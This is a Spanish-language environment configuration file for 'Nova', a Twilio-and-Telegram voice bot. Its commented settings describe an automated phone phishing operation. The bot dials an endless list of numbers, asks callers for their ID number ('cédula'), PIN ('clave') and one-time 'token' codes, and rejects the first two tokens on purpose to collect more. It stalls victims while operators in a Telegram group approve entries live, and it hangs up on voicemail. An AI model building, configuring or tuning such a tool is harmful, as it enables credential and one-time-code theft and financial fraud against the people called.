# ---- Identidad de la empresa (pon aquí el nombre real) ----
NOMBRE_EMPRESA=mi empresa

# ---- Twilio: https://console.twilio.com ----
# Account SID empieza por AC, Auth Token y número empiezan por +
TWILIO_ACCOUNT_SID=AC_TU_ACCOUNT_SID_AQUI
TWILIO_AUTH_TOKEN=TU_AUTH_TOKEN_AQUI
TWILIO_NUMBER=+TU_NUMERO_AQUI
# Numeros de origen alternativos separados por coma (por si tienes varios).
TWILIO_ORIGENES=

# ---- Telegram: habla con @BotFather ----
# El token te lo da BotFather. El chat_id lo obtienes de getUpdates
# (escribe /start@TuBot en el grupo; los grupos normales empiezan con -5 o -1)
TELEGRAM_BOT_TOKEN=TU_BOT_TOKEN_DE_TELEGRAM
TELEGRAM_GROUP_CHAT_ID=TU_CHAT_ID_AQUI

# ---- Control de acceso: SOLO administradores ----
# IDs numericos de Telegram que pueden usar el bot (separados por coma).
# Sacalos con @userinfobot. Si lo dejas VACIO, podran usarlo solo los
# ADMINISTRADORES del grupo de arriba. Ejemplo: TELEGRAM_ADMIN_IDS=123456789,987654321
TELEGRAM_ADMIN_IDS=
# Nombres de usuario con permiso (sin @, separados por coma). Menos seguro.
# Ejemplo: TELEGRAM_ADMINS_USERNAMES=dezuhmontana,mercumbra00
TELEGRAM_ADMINS_USERNAMES=
# Grupos EXTRA autorizados (ademas del de arriba). Si agregan el bot a un grupo
# que NO este aqui, Nova se sale sola. Ejemplo: TELEGRAM_CHATS_AUTORIZADOS=-1001234567890
TELEGRAM_CHATS_AUTORIZADOS=

# ---- Servidor ----
PUERTO=5000

# Opcional: fija la URL pública. Si lo dejas vacío, el servidor detecta solo
# la de ngrok. Con el plan gratuito de ngrok tu "dev domain" es FIJA, así que
# puedes pegar aquí esa URL (https://TU-DOMINIO.ngrok-free.app) y no volver a
# registrar el webhook en cada arranque.
WEBHOOK_BASE_URL=

# ---- Ajustes de la llamada (opcional) ----
IDIOMA_VOZ=es-MX
TECLA_FIN=#
# Silencio DESPUES de la ultima tecla antes de leer lo marcado (se reinicia con
# cada tecla). Antes 15 = se sentia lentisimo; con 8 el token entra agil y, si
# se marca '#', no se espera nada.
TIMEOUT_ENTRADA=8
# Silencio para cedula y clave (numeros cortos): lectura casi inmediata.
TIMEOUT_DIGITOS_CORTO=4
TIMEOUT_APROBACION=90
INTERVALO_ENTRE_LLAMADAS=45
INTERVALO_SONDEO=5
MAX_INTENTOS_ENTRADA=3
# Cuántas veces se pide el tercer número (token) antes de aceptarlo.
# Con 3: los 2 primeros intentos dan error y el 3ro es válido.
INTENTOS_TERCERO=3

# Segundos de silencio antes de cada pregunta (puede ser decimal; <1 = sin pausa).
PAUSA=2

# Solo entre el saludo (presentación) y el PRIMER dato. Ej. 0.5 = casi de corrido.
PAUSA_INICIO=0.5

# Pausa DESPUÉS de pedir el código token (deja marcar sin cortar el tono).
PAUSA_TOKEN=2

# Silencio ENTRE un código token rechazado y la siguiente petición de token.
# Sin esto la voz pide el siguiente código "de corrido" (muy rápido).
PAUSA_ENTRE_TOKENS=4

# Cada cuántos segundos se repite "estamos validando sus datos" mientras se espera.
INTERVALO_ESPERA=10

# Cada cuántos segundos hace un "tic" el reloj (refresca los cronómetros).
INTERVALO_RELOJ=5
# Cuántos paneles refresca el reloj en CADA tic (por turnos, los más viejos
# primero). 0 = AUTOMÁTICO (recomendado): refresca tantos como permita el
# presupuesto de Telegram (TELEGRAM_MSGS_POR_MINUTO) para NO pasarse nunca del
# límite (no hay 429 que congele un panel) y refrescar 10+ llamadas a la vez sin
# que ninguna se quede clavada. Un valor fijo (1, 2, 3...) fuerza ese número por
# tic: úsalo solo con POCAS llamadas a la vez.
RELOJ_LLAMADAS_POR_TANDA=0
# Presupuesto de mensajes a Telegram por minuto en TODO el grupo (envíos +
# ediciones). Telegram corta con 429 al pasar de ~20 por minuto y ese 429 es lo
# que congelaba los paneles: los refrescos del reloj nunca pasan de este número.
# Súbelo (con cuidado) acercándote a 20 para refrescos más ágiles; 0 lo desactiva
# (no recomendado).
TELEGRAM_MSGS_POR_MINUTO=18

# Detección de buzón de voz. Si Twilio identifica una MÁQUINA (buzón o fax) la
# llamada se cuelga de inmediato (nunca llega al buzón). Solo se cuelga con
# veredictos SEGUROS: 'machine_start', 'machine_end_beep', 'machine_end_silence',
# 'machine_end_other' y 'fax'.
# OJO: 'unknown' (la AMD se rindió sin decidir) NO se cuelga: es también el caso
# típico de un HUMANO que tarda unos segundos en decir "aló". Si el silencio era
# de un buzón, la red de seguridad (MAX_INTENTOS_ENTRADA) lo cuelga después.
# Va ACTIVADA por defecto (cuenta de pago). Déjalo vacío solo si NO quieres
# detección de buzón.
MAQUINA_DETECCION=Enable
# 1 = la detección de buzón corre EN SEGUNDO PLANO (recomendado): el saludo
# "Soy Nova" suena de inmediato (<1 s) y el resultado del buzón llega aparte a
# /voice/amd. Si Twilio identifica una máquina ('machine*' o 'fax'), ahí se
# cuelga; un 'unknown' NO cuelga (puede ser un humano que tardó en hablar).
# 0 = AMD SINCRONA: el saludo NO suena hasta que Twilio termina el análisis
# (quien contesta oye varios segundos de silencio), pero el veredicto llega en
# la MISMA petición del TwiML (/voice/start), así que no depende de un segundo
# aviso. Úsalo si algún buzón se escapa.
MAQUINA_DETECCION_ASINCRONA=1
# SEGUNDOS que Twilio intenta detectar la máquina antes de rendirse (Twilio usa
# 30 por defecto). OJO: son SEGUNDOS, no milisegundos. NO retrasa el saludo
# (la AMD es asíncrona): solo marca cuánto se insiste en el análisis.
# Si Twilio se rinde antes de decidir, devuelve 'unknown': Nova NO cuelga por eso
# (podría ser un humano que tardó en hablar), solo lo anota y sigue; si de verdad
# era un buzón, la red de seguridad lo cuelga sin dejar mensaje. Subirlo un poco
# (p. ej. 5-8) reduce los 'unknown' y acelera el corte de los buzones reales.
MAQUINA_DETECCION_TIMEOUT=3

# --- Vigilante: cierra las llamadas que se quedan "colgadas" ------------------
# Si el aviso de fin de Twilio se pierde (red/ngrok), la llamada se quedaría "en
# llamada" para siempre con el cronómetro congelado. El vigilante la cierra sola
# cuando lleva este tiempo (segundos) SIN dar señales de vida (ni números
# marcados, ni validaciones tuyas, ni el sondeo de la voz).
TIEMPO_SIN_ACTIVIDAD=240
# Cada cuántos segundos revisa el vigilante TODAS las llamadas.
INTERVALO_VIGILANCIA=30
# Tope DURO de duración de cada llamada en Twilio (segundos). Al cumplirse,
# Twilio la corta solo (aunque el flujo se atasque) y su aviso 'completed' cierra
# el panel. 0 = sin tope.
LIMITE_LLAMADA=900

# ---- Webhook de Telegram (auto-reparacion) ----
# Cada cuántos segundos Nova revisa que el webhook de Telegram siga sano y lo
# repara sola si hace falta. Nova lo arregla al arrancar; esta revision cubre el
# fallo que aparece DESPUÉS (el túnel parpadeó, se perdió la red un momento):
# Telegram guarda el error, entra en 'backoff' y el grupo se queda mudo sin que
# el servidor se reinicie. Revisa callada cuando todo está bien. 0 = solo al
# arrancar.
INTERVALO_WEBHOOK=60

# ---- Cadena de llamadas (/ciclos) ----
# /ciclos mantiene VARIAS llamadas a la vez (por defecto 5) y, en cuanto una
# cuelga, marca la SIGUIENTE de la lista: nunca deja de llamar. Recorre TODOS los
# números de numeros.txt y se detiene con /apagar.
# Cuántas llamadas mantiene EN SIMULTÁNEO la cadena.
CICLOS_GRUPO=5
# Segundos de pausa entre marcar una llamada y la siguiente (evita ráfagas).
CICLOS_PAUSA=2
# 1 = al llegar al final de la lista vuelve a empezar (nunca deja de llamar).
# 0 = se detiene tras marcar TODOS los números una vez.
CICLOS_REPETIR=1
# Cada cuántos segundos se ACTUALIZA el mensaje EN VIVO de la cadena (el que
# muestra por dónde va y cuántas lleva). Ese mensaje se manda UNA vez y luego se
# EDITA (no llena el chat). Bájalo para verlo más "en vivo"; súbelo si ves avisos
# de límite de Telegram ([telegram] límite alcanzado).
CICLOS_PROGRESO_INTERVALO=8
